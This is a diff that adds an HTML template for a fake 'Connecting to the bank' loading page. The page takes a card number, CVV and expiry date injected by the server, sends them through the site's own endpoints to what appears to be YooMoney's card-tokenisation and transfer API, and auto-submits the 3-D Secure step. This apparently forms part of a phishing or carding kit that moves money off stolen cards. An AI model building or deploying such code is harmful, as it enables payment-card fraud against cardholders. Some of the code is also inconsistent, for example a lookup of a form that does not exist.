@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подключение к банку</title>
+    <style>
+        body {
+            color: #fff;
+            text-align: center;
+            background-color: #a3bfec;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        h1,
+        p {
+            margin: 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Подключение к банку.</h1>
+    <p>Это займёт пару секунд.</p>
+    <img src="https://cdn.dribbble.com/users/5233537/screenshots/14285996/media/421d035bbb3cbbc03407584de500e08f.gif">
+
+    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.7.3/build/md5.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <form id="paymentForm" action="" method="POST">
+        <input type="hidden" name="PaReq" value="">
+        <input type="hidden" name="MD" value="">
+        <input type="hidden" name="TermUrl" value="">
+    </form>
+    <script>
+        async function getSecretKey() {
+            const sum = <%= amount %>; // Пример суммы для запроса (можно динамически указывать)
+            const url = '/api/v1/getSecretKey'; // URL вашего сервера
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ sum })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to fetch secret key');
+                }
+
+                const responseData = await response.json();
+                if (responseData.success === "True") {
+                    const secretKey = responseData.secretKey;
+
+                    // Данные для отправки
+                    const paymentData = {
+                        "csc": "<%= cvv %>",
+                        "pan": "<%= card %>",
+                        "expireDate": "20<%= date %>"
+                    };
+
+                    // URL для отправки POST-запроса
+                    const paymentUrl = '/api/v1/getSynonym';
+
+                    // Функция для отправки POST-запроса
+                    async function sendPaymentData() {
+                        try {
+                            const paymentResponse = await fetch(paymentUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(paymentData)
+                            });
+
+                            if (!paymentResponse.ok) {
+                                throw new Error('Failed to send data to YooMoney');
+                            }
+
+                            const jsonResponse = await paymentResponse.json();
+
+                            const createUrl = '/api/v1/transfer'
+                            const createData = {
+                                "paymentCardSynonym": jsonResponse.result.cardSynonym,
+                                "sum": {
+                                    "value": <%= amount %>,
+                                "alphabeticCurrency": "RUB"
+                            },
+                            "x-csrf-token": secretKey
+                        }
+
+                            // Отправляем запрос на создание платежа
+                            await createPayment(createUrl, createData);
+
+                    } catch (error) {
+                        console.error('Error sending data to YooMoney:', error.message);
+                    }
+                }
+
+                async function getPayment(url, data) {
+                    try {
+                        const response = await fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        });
+
+                        if (!response.ok) {
+                            throw new Error('Failed to create payment');
+                        }
+
+                        const responseData = await response.json();
+                        // Получаем форму по её id
+                        console.log(responseData);
+                        const form = document.getElementById('paymentForm');
+
+                        async function fillAndSubmitForm(responseData) {
+                            try {
+                                // Проверяем, есть ли данные для нового формата ответа
+                                if (responseData.result.status === "awaitingpayerauthentication" &&
+                                    responseData.result.subStatus === "Wait3dsAuthentication" &&
+                                    responseData.result.acsData && responseData.result.acsData.fingerprint) {
+                                    
+                                    // Новый формат ответа
+                                    console.log('Detected new response format. Using new form.');
+
+                                    // Создаем форму
+                                    const form = document.createElement('form');
+                                    form.method = 'POST';
+                                    form.action = 'https://3ds-gate.yoomoney.ru/card-auth'; // URL для отправки формы
+                                    form.style.display = 'none'; // Скрываем форму
+
+                                    // Добавляем поля к форме
+
+                                    // Поле methodData
+                                    const methodDataInput = document.createElement('input');
+                                    methodDataInput.type = 'hidden';
+                                    methodDataInput.name = 'methodData';
+                                    methodDataInput.value = responseData.result.acsData.fingerprint.threeDsMethodData;
+                                    form.appendChild(methodDataInput);
+
+                                    // Поле methodUrl
+                                    const methodUrlInput = document.createElement('input');
+                                    methodUrlInput.type = 'hidden';
+                                    methodUrlInput.name = 'methodUrl';
+                                    methodUrlInput.value = encodeURIComponent(responseData.result.acsData.fingerprint.threeDsMethodUrl);
+                                    form.appendChild(methodUrlInput);
+
+                                    // Поле orderN
+                                    const orderNInput = document.createElement('input');
+                                    orderNInput.type = 'hidden';
+                                    orderNInput.name = 'orderN';
+                                    orderNInput.value = responseData.result.acsData.fingerprint.orderN;
+                                    form.appendChild(orderNInput);
+
+                                    // Добавляем форму на страницу
+                                    document.body.appendChild(form);
+
+                                    // Отправляем форму
+                                    form.submit();
+                                } 
+                                // Если старый формат ответа
+                                else if (responseData.result.acsData && responseData.result.acsData.challenge) {
+                                    console.log('Detected old response format. Using old form.');
+
+                                    // Старый формат ответа - используем существующую форму
+                                    const form = document.querySelector('#existingForm'); // Ищем старую форму на странице
+
+                                    // Заполняем скрытые поля формы
+                                    form.querySelector('input[name="PaReq"]').value = responseData.result.acsData.challenge.parameters.PaReq;
+                                    form.querySelector('input[name="MD"]').value = responseData.result.acsData.challenge.parameters.MD;
+                                    form.querySelector('input[name="TermUrl"]').value = responseData.result.acsData.challenge.parameters.TermUrl;
+
+                                    // Устанавливаем атрибут action формы
+                                    form.action = responseData.result.acsData.challenge.url; // URL для отправки формы
+
+                                    // Отправляем форму
+                                    form.submit();
+                                } 
+                                else {
+                                    console.log('Payment is still processing or format not recognized.');
+                                }
+                            } catch (error) {
+                                console.error('Error filling and submitting form:', error.message);
+                            }
+                        }
+
+
+                        fillAndSubmitForm(responseData);
+
+                    } catch (error) {
+                        console.error('Error creating payment:', error.message);
+                    }
+                }
+
+                // Функция для создания платежа
+                async function createPayment(url, data) {
+                    try {
+                        const response = await fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        });
+
+                        if (!response.ok) {
+                            throw new Error('Failed to create payment');
+                        }
+
+                        const responseData = await response.json();
+
+                        const urlProcess = "/api/v1/processPayment"
+                        const dataProcess = {
+                            "xCsrfToken": secretKey,
+                            "orderId": responseData.result.orderId
+                        }
+                        getPayment(urlProcess, dataProcess)
+
+                        // Ждем 2 секунды перед повторным вызовом функции
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+
+                        // Вызываем функцию снова
+                        await getPayment(urlProcess, dataProcess);
+
+                    } catch (error) {
+                        console.error('Error creating payment:', error.message);
+                    }
+                }
+
+                // Вызываем функцию для отправки данных
+                await sendPaymentData();
+
+            } else {
+                console.error('Error:', responseData.systemMessage);
+            }
+        } catch (error) {
+            console.error('Error fetching secret key:', error.message);
+        }
+        }
+
+        // Вызываем функцию getSecretKey при загрузке страницы
+        window.onload = function () {
+            getSecretKey();
+        };
+    </script>
+</body>
+
+</html>
